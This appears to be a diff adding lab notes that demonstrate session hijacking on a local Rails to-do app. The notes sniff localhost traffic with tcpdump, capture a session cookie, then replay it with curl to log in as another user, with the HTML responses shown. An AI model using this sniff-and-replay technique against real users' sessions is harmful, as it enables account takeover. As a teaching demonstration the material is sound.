@@ -1,0 +1,90 @@
+**listen for trafic on localhost
+sudo tcpdump -i any -A host localhost
+	output excerpt:
+	User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
+	Accept: */*
+	If-None-Match: "2ad525abf5c9a8721aff9bafcf73555b"
+	Referer: http://localhost:3000/
+	Accept-Encoding: gzip,deflate,sdch
+	Accept-Language: en-US,en;q=0.8
+	Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+	Cookie: _rails_topics_after_8_june_2012_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFRkkiJWFmZDJjYWU5YWY1M2E4MmU5MmUzOTA1MzhjOGNiYjdjBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMTkzekdUcERPcERsZkFZaFc5eU1uODBWOVhpV3ZDdkYya1FXakJkNjF3SWs9BjsARkkiDHVzZXJfaWQGOwBGaQg%3D--5470438db653d18db831c5e941e720468446fa8c	
+
+
+**curl without session
+curl http://localhost:3000
+	result:
+	<!DOCTYPE html>
+	<html>
+	  <head>
+	    <title>To Do List</title>
+	    <link href="/assets/application.css?body=1" media="all" rel="stylesheet" type="text/css" />
+	<link href="/assets/layout.css?body=1" media="all" rel="stylesheet" type="text/css" />
+	<link href="/assets/tasks.css?body=1" media="all" rel="stylesheet" type="text/css" />
+	<link href="/assets/users.css?body=1" media="all" rel="stylesheet" type="text/css" />
+	    <script src="/assets/jquery.js?body=1" type="text/javascript"></script>
+	<script src="/assets/jquery_ujs.js?body=1" type="text/javascript"></script>
+	<script src="/assets/sessions.js?body=1" type="text/javascript"></script>
+	<script src="/assets/tasks.js?body=1" type="text/javascript"></script>
+	<script src="/assets/users.js?body=1" type="text/javascript"></script>
+	<script src="/assets/application.js?body=1" type="text/javascript"></script>
+	    <meta content="authenticity_token" name="csrf-param" />
+	<meta content="YSeNAA2yLcPiJM4NVcNT/DbO34ZnhgJUXgbA7fsO2nw=" name="csrf-token" />
+	  </head>
+	  <body>
+	    <div id="container">
+
+	      <h1>To Do List</h1>
+
+	  <p><strong>Currently not logged in.</strong></p>
+	  <p>
+	    First <a href="/signup">Sign Up</a>
+	    or <a href="/login">Log In</a>
+	  </p>
+
+	    </div>
+	  </body>
+	</html>
+
+**curl capitalizing on session provided by tcpdump
+curl http://localhost:3000 -H 'Cookie: _rails_topics_after_8_june_2012_session=BAh7CEkiD3Nlc3Npb25faWQGOgZFRkkiJWFmZDJjYWU5YWY1M2E4MmU5MmUzOTA1MzhjOGNiYjdjBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMTkzekdUcERPcERsZkFZaFc5eU1uODBWOVhpV3ZDdkYya1FXakJkNjF3SWs9BjsARkkiDHVzZXJfaWQGOwBGaQg%3D--5470438db653d18db831c5e941e720468446fa8c'
+	result(this time the attacker is logging in):
+	<!DOCTYPE html>
+	<html>
+	  <head>
+	    <title>To Do List</title>
+	    <link href="/assets/application.css?body=1" media="all" rel="stylesheet" type="text/css" />
+	<link href="/assets/layout.css?body=1" media="all" rel="stylesheet" type="text/css" />
+	<link href="/assets/tasks.css?body=1" media="all" rel="stylesheet" type="text/css" />
+	<link href="/assets/users.css?body=1" media="all" rel="stylesheet" type="text/css" />
+	    <script src="/assets/jquery.js?body=1" type="text/javascript"></script>
+	<script src="/assets/jquery_ujs.js?body=1" type="text/javascript"></script>
+	<script src="/assets/sessions.js?body=1" type="text/javascript"></script>
+	<script src="/assets/tasks.js?body=1" type="text/javascript"></script>
+	<script src="/assets/users.js?body=1" type="text/javascript"></script>
+	<script src="/assets/application.js?body=1" type="text/javascript"></script>
+	    <meta content="authenticity_token" name="csrf-param" />
+	<meta content="93zGTpDOpDlfAYhW9yMn80V9XiWvCvF2kQWjBd61wIk=" name="csrf-token" />
+	  </head>
+	  <body>
+	    <div id="container">
+
+	      <h1>To Do List</h1>
+
+	  <form accept-charset="UTF-8" action="/tasks" class="new_task" id="new_task" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="93zGTpDOpDlfAYhW9yMn80V9XiWvCvF2kQWjBd61wIk=" /></div>
+	    <input id="task_name" name="task[name]" size="30" type="text" />
+	    <input name="commit" type="submit" value="Add" />
+	</form>
+	  <ul id="tasks">
+	  </ul>
+
+	  <p id="logged_in">
+	    Logged in as <strong>petrero</strong>.
+	    <a href="/logout">Log Out</a>
+	  </p>
+
+	    </div>
+	  </body>
+	</html>
+
+
